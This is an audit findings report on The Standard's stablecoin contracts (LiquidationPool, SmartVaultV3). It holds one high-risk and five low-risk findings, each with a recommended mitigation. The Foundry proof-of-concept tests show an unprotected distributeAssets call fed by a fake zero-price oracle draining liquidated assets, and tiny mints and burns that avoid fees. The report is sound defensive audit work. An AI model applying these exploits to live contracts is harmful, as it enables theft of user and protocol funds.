# The Standard - Findings Report

# Table of contents

- ## [Contest Summary](#contest-summary)
- ## [Results Summary](#results-summary)
- ## High Risk Findings
  - ### [H-01. Arbitrary Argument Vulnerability in `LiquidationPool::distributeAssets` Allows Potential Asset Theft](#H-01)
- ## Low Risk Findings
  - ### [L-01. `LiquidationPool::distributionFees` include `pendingStakes` array in its implementation which can lead to frontrun.](#L-01)
  - ### [L-02. `LiquidationPool::position` Function Doesn't Account for `LiquidationPoolManager::poolFeePercentage`, Leading to Misleading Information](#L-02)
  - ### [L-03. Absence of Stored Accepted Token in `SmartVaultV3` May Lead to Loss of Funds and Inflation of the Used Stablecoin](#L-03)
  - ### [L-04. `LiquidationPool::distributeAssets` Round-Down Issue Excludes Small Stakers from Receiving Tokens](#L-04)
  - ### [L-05. Lack of Minimum Amount Check in `SmartVaultV3::mint`, `SmartVaultV3::burn`, and `SmartVaultV3::swap` Can Result in Loss of Fees](#L-05)

# <a id='contest-summary'></a>Contest Summary

### Sponsor: The Standard

### Dates: Dec 27th, 2023 - Jan 10th, 2024

[See more contest details here](https://www.codehawks.com/contests/clql6lvyu0001mnje1xpqcuvl)

# <a id='results-summary'></a>Results Summary

### Number of findings:

- High: 1
- Medium: 0
- Low: 5

# High Risk Findings

## <a id='H-01'></a>H-01. Arbitrary Argument Vulnerability in `LiquidationPool::distributeAssets` Allows Potential Asset Theft

### Relevant GitHub Links

https://github.com/Cyfrin/2023-12-the-standard/blob/main/contracts/LiquidationPool.sol#L205

## Description

The `LiquidationPool::distributeAssets` function, being external and accepting arbitrary `ILiquidationPoolManager.Asset` arguments without proper verification, exposes a vulnerability. Any user can potentially frontrun `distributeAssets` by providing an arbitrary `assets` array, linked to a malicious oracle or setting `_hundredPC = 0` to distribute all liquidated assets for free to stakers.

```javascript
@>    function distributeAssets(ILiquidationPoolManager.Asset[] memory _assets, uint256 _collateralRate, uint256 _hundredPC) external payable {
        .
        .
        .
    }
```

See PoC below for a concrete example.

## Impact

- Loss of funds for the protocol
- EUROs stablecoin total supply may increase (inflation).

## Proof of Concept

<details>

<summary>Foundry PoC</summary>

```javascript
    function testDistributeTokenForFree() public {
        // Biggest staker
        vm.startPrank(staker);
        EUROs.approve(address(pool), 10_000_000e18);
        TST.approve(address(pool), 10_000_000e18);
        pool.increasePosition(10_000_000e18, 10_000_000e18);
        vm.stopPrank();

        // Skip time to consolidate pending stakes
        skip(2 days);

        // Simulate vault liquidation setting up assets in liquidationPoolManager
        vm.prank(protocol);
        USDs.mint(address(liquidationPoolManager), 10000e18);
        vm.prank(address(liquidationPoolManager));
        // liquidationPoolManager approve assets just before calling distributeAssets
        USDs.approve(address(pool), 10000e18);

        // Deploy a fake oracle
        vm.startPrank(staker);
        ChainlinkMock badOracle = new ChainlinkMock("ANY / USD");
        badOracle.setPrice(0);

        // Build arbitrary assets to steal all the pool:
        // USDs here, but it can be any token which will be distributed.
        // Assets need to have the same symbol and address as those the attacker wants to steal
        ITokenManager.Token memory usdsToSteal = ITokenManager.Token(
            "USDs",
            address(USDs),
            18,
            address(badOracle),
            18
        );

        ILiquidationPoolManager.Asset[]
            memory assets = new ILiquidationPoolManager.Asset[](1);
        assets[0] = ILiquidationPoolManager.Asset(
            usdsToSteal,
            USDs.balanceOf(address(liquidationPoolManager))
        );

        // Call distributeAssets with the built token
        // frontrunning the liquidationPoolManager.
        // The other parameters can be anything (but 0 for collateralRate) because
        // the fake oracle returns that the cost is 0.
        // You can also set _hundredPC to 0 with a trusted oracle; the vulnerability will work.
        pool.distributeAssets(assets, 1, 0);

        // Staker claims free assets
        pool.claimRewards();
        vm.stopPrank();

        // Staker have stolen all assets without paying
        assertEq(EUROs.balanceOf(address(pool)), 10_000_000e18);
        assertEq(USDs.balanceOf(staker), 10000e18);
    }
```

</details>

## Recommended Mitigation

Since only the `LiquidationPoolManager` uses `LiquidationPool::distributeAssets` and can provide the correct parameters, add the `onlyManager` modifier.

```diff
    function distributeAssets(
        ILiquidationPoolManager.Asset[] memory _assets,
        uint256 _collateralRate,
        uint256 _hundredPC
-    ) external payable {
+    ) external payable onlyManager {
        .
        .
        .
    }
```

# Low Risk Findings

## <a id='L-01'></a>L-01. `LiquidationPool::distributionFees` include `pendingStakes` array in its implementation which can lead to frontrun.

### Relevant GitHub Links

https://github.com/Cyfrin/2023-12-the-standard/blob/main/contracts/LiquidationPool.sol#L191

## Description

In the `LiquidationPool::distributionFees` function, the process is as follows:

- The function utilizes `getTstTotal()` to determine the total TST in the contract, including the TST in the `pendingStakes` array.
- It adds EUROs proportionally based on the number of TST staked by position and pending stake.

The issue arises when any user can inject a significant amount of TST into the contract before any `mint` / `burn` / `swap` operation of any vault. An attacker can exploit this by frontrunning the `mint` / `burn` / `swap` function of any vault, injecting a substantial stake, and then strategically invoking `LiquidationPoolManager::distributeFees` to claim the majority of the fees.

```javascript
    function distributeFees(uint256 _amount) external onlyManager {
        uint256 tstTotal = getTstTotal();
        if (tstTotal > 0) {
            .
            .
            .
            for (uint256 i = 0; i < pendingStakes.length; i++) {
@>                pendingStakes[i].EUROs +=
                    (_amount * pendingStakes[i].TST) /
                    tstTotal;
            }
        }
    }
```

## Impact

This vulnerability leads to a loss of rewards for all other users of the pool.

## Recommended Mitigation

To address this issue, implement a function that retrieves only TST in the `positions` array and excludes pending stakes from the fees distribution. The example below adheres to the current implementation logic, but it's advised to create a `uint256` variable to track TST in positions and avoid using a for loop on a dynamic array, which could potentially grow and result in a denial-of-service scenario.

```diff
+    function getPositionTotal() private view returns (uint256 _tst) {
+        for (uint256 i = 0; i < holders.length; i++) {
+            _tst += positions[holders[i]].TST;
+        }
+    }

    function distributeFees(uint256 _amount) external onlyManager {
-        uint256 tstTotal = getTstTotal();
+       uint256 tstTotal = getPositionTotal();
        if (tstTotal > 0) {
            .
            .
            .
-            for (uint256 i = 0; i < pendingStakes.length; i++) {
-               pendingStakes[i].EUROs +=
-                    (_amount * pendingStakes[i].TST) /
-                    tstTotal;
-            }
        }
    }
```

## <a id='L-02'></a>L-02. `LiquidationPool::position` Function Doesn't Account for `LiquidationPoolManager::poolFeePercentage`, Leading to Misleading Information

### Relevant GitHub Links

https://github.com/Cyfrin/2023-12-the-standard/blob/main/contracts/LiquidationPool.sol#L88

## Description

The `LiquidationPool::position` function returns information about all the money staked in the contract, including pending and consolidated stake. However, it doesn’t take into account the `poolFeePercentage` from `LiquidationPoolManager`, leading to false information. Trying to anticipate the fees that have not yet been distributed results in an inaccurate representation of the staker's holdings. The returned information is higher than the actual value, which can potentially disappoint stakers who rely on this function to assess their holdings.

```javascript
    function position(address _holder) external view returns(Position memory _position, Reward[] memory _rewards) {
        _position = positions[_holder];
        (uint256 _pendingTST, uint256 _pendingEUROs) = holderPendingStakes(_holder);
        _position.EUROs += _pendingEUROs;
        _position.TST += _pendingTST;
@>        if (_position.TST > 0) _position.EUROs += IERC20(EUROs).balanceOf(manager) * _position.TST / getTstTotal();
        _rewards = findRewards(_holder);
    }
```

## Impact

Users will perceive a lower value than indicated by the `position` function due to the lack of consideration for `poolFeePercentage`. This is particularly impactful since users often rely on the `position` function to assess their holdings, given that the `positions` array is private. Consequently, users might feel disappointed or confused by the inaccurate information, making it challenging for them to accurately determine the real amount for calls to `LiquidationPoolManager::decreasePosition`. Users would need to calculate the actual amount themselves, introducing complexity and potential frustration.

## Recommended Mitigation

Adjust the logic of the `LiquidationPool::position` function to account for `LiquidationPoolManager::poolFeePercentage`. An example of the modification is provided below:

```diff
    function position(
        address _holder
    )
        external
        view
        returns (Position memory _position, Reward[] memory _rewards)
    {
        .
        .
        .
        if (_position.TST > 0)
-            _position.EUROs +=
-                (IERC20(EUROs).balanceOf(manager) * _position.TST) /
-                getTstTotal();

+            _position.EUROs +=
+                (IERC20(EUROs).balanceOf(manager) * _position.TST) * manager.poolFeePercentage() /
+                (getTstTotal() * manager.HUNDRED_PC());
        _rewards = findRewards(_holder);
    }
```

## <a id='L-03'></a>L-03. Absence of Stored Accepted Token in `SmartVaultV3` May Lead to Loss of Funds and Inflation of the Used Stablecoin

### Relevant GitHub Links

https://github.com/Cyfrin/2023-12-the-standard/blob/main/contracts/SmartVaultV3.sol#L178

https://github.com/Cyfrin/2023-12-the-standard/blob/main/contracts/SmartVaultV3.sol#L68

https://github.com/Cyfrin/2023-12-the-standard/blob/main/contracts/SmartVaultV3.sol#L84

https://github.com/Cyfrin/2023-12-the-standard/blob/main/contracts/SmartVaultV3.sol#L119

## Description

Accepted tokens are queried from the `TokenManager` each time instead of being stored in the vault at its creation. While adding a new token might be straightforward for vaults, removing one can have catastrophic consequences.

A simple example involves a user with only WBTC, minting 99% of what they can borrow. If WBTC is removed, `maxMintable` will return 0, and `undercollateralized` will return `true`. The vault will be liquidated, but no `Asset` will be distributed, resulting in a complete loss for the protocol and inflating the EUROs stablecoin.

## Impact

- Loss of funds for the protocol if the token represents a significant portion of collateral in user vaults.
- Unexpected liquidation for users, resulting in a potential loss of all other tokens in the vault.
- Inflation of the borrowed stablecoin.

If removing tokens becomes a common feature, this is a HIGH finding. However, assuming the likelihood is low (only in the case of a bug with a token), the severity is considered MEDIUM.

## Proof of Concept

<details>

<summary>Foundry PoC</summary>

```javascript
    function testManagerRemoveToken() public {
        uint EUROs_TotalSupply_mintedInSetUp = 10000e18;
        // Normal usage of the vault: borrow 90 EUROs with 100 USDs in collateral
        vm.startPrank(vaultUser);
        USDs.transfer(address(vault), 100e18);
        uint fees = (10e18 * 500) / 1e5;
        vault.mint(vaultUser, 90e18);
        vm.stopPrank();

        // Token removal
        vm.prank(protocol);
        tokenManager.removeAcceptedToken("USDs");

        // Catastrophe happens
        assertTrue(vault.undercollateralised());
        vm.prank(protocol);
        liquidationPoolManager.runLiquidation(vaultID);

        // Vault was liquidated without restituting euros or tokens
        assertEq(USDs.balanceOf(protocol), 0);
        assertTrue(EUROs.balanceOf(protocol) < 100e18);

        // EUROs total supply has inflated!
        assertTrue(EUROs.totalSupply() > EUROs_TotalSupply_mintedInSetUp);
    }
```

</details>

## Recommended Mitigation

- Store accepted tokens in the vault. Moreover, it would consume less gas.
- If a token needs to be removed, warn users in advance and encourage them to open a new vault.

## <a id='L-04'></a>L-04. `LiquidationPool::distributeAssets` Round-Down Issue Excludes Small Stakers from Receiving Tokens

### Relevant GitHub Links

https://github.com/Cyfrin/2023-12-the-standard/blob/main/contracts/LiquidationPool.sol#L219

## Description

The problematic line in `LiquidationPool::distributeAssets` is as follows:

`uint256 _portion = (asset.amount * _positionStake) / stakeTotal;`

If a vault holds a small amount (numerically) of an asset with a few decimals (e.g., 6 like USDC or 8 like WBTC), the result of the portion calculation will be 0 for small stakers due to rounding down.

Example for 0.01 WBTC (467$):

`0.01e8 WBTC * 10 TST_EUR / 11_000_000 = 1e7 / 1.1e7 = 0`

## Impact

This may result in only large stakers being able to receive tokens with low decimals and/or in small amounts (e.g., 0.01 WBTC, which is considered a substantial amount).

## Recommended Mitigation

Several possible solutions include:

- Warn users in the documentation about the potential limitation.
- Implement a minimum stake requirement.
- Avoid using tokens with few decimals.

## <a id='L-05'></a>L-05. Lack of Minimum Amount Check in `SmartVaultV3::mint`, `SmartVaultV3::burn`, and `SmartVaultV3::swap` Can Result in Loss of Fees

### Relevant GitHub Links

https://github.com/Cyfrin/2023-12-the-standard/blob/main/contracts/SmartVaultV3.sol#L170

https://github.com/Cyfrin/2023-12-the-standard/blob/main/contracts/SmartVaultV3.sol#L161

https://github.com/Cyfrin/2023-12-the-standard/blob/main/contracts/SmartVaultV3.sol#L215

## Description

The absence of a minimum requirement check for `_amount` in `SmartVaultV3::mint`, `SmartVaultV3::burn`, and `SmartVaultV3::swap` allows a user to send a very small amount, effectively bypassing fees.

## Impact

This could result in a loss of fees for the protocol. However, the likelihood of this scenario is low, given that an attacker would need to spend a significant amount of gas for multiple transactions, making it less impactful.

It's important to note that if any fees rate is decreased in the future, it could exacerbate the problem.

## Proof of Concept

<details>

<summary>Foundry PoC</summary>

```javascript
    function testMintWeakAmountForNoFee() public {
        vm.startPrank(vaultUser);
        USDs.transfer(address(vault), 100e18);

        // Loop to mint without fees
        for (uint i; i < 20; i++) {
            vault.mint(vaultUser, 18);
        }

        // Check the USDs balance of the manager
        assertEq(EUROs.balanceOf(address(liquidationPoolManager)), 0);

        vm.stopPrank();
    }

    function testBurnWeakAmountForNoFee() public {
        vm.startPrank(vaultUser);
        USDs.transfer(address(vault), 100e18);

        vault.mint(vaultUser, 10e18);

        // Loop to burn without fees
        for (uint i; i < 20; i++) {
            vault.burn(18);
        }

        // Check the USDs balance of the manager, removing minting fees
        assertEq(EUROs.balanceOf(address(liquidationPoolManager)) - 5e16, 0);

        vm.stopPrank();
    }
```

</details>

## Recommended Mitigation

Implement a minimum threshold check in `SmartVaultV3::mint`, `SmartVaultV3::burn`, and `SmartVaultV3::swap`. Example: `require(_amount > 1e8)`.
